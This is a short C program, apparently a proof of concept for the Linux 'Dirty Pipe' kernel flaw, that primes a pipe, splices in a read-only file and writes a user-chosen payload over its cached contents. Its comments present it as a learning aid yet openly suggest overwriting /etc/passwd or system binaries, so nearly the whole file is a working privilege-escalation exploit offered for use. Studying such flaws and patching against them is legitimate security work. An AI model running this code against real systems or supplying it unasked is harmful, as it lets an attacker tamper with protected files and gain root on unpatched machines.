// for learning create a non writeable file and give the file name as arg and enter the payload 
//you can use this exploit to modify any non-writeable files, for eg:/etc/passwd or any bin files

#define _GNU_SOURCE
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<unistd.h>
#include<sys/stat.h>
#include<sys/types.h>
#include<fcntl.h>

void pipe_prep(int *pfd){
    char buffer[4096];
    int bfsz=sizeof(buffer);
    int  pipe_buff_sz=fcntl(pfd[1],F_GETPIPE_SZ);
    for(int i=pipe_buff_sz;i>0;){

       write(pfd[1],buffer,bfsz);
       i-=bfsz;
    }
    for(int i=pipe_buff_sz;i>0;){

       read(pfd[0],buffer,bfsz);
       i-=bfsz;
    }
}

void dirty_pipe(int *pfd,int fd, char *payload){
                                   
    splice(fd,0,pfd[1],NULL,1,0);
    write(pfd[1],payload,strlen(payload));
}
int main(int argc,char **argv){
   if(argc<3){printf("please enter %s filename payload",argv[0]);exit(1);}
   int pfd[2];
   int fd=open(argv[1],O_RDONLY);
   pipe(pfd);
   pipe_prep(pfd);
   dirty_pipe(pfd,fd,argv[2]);
}
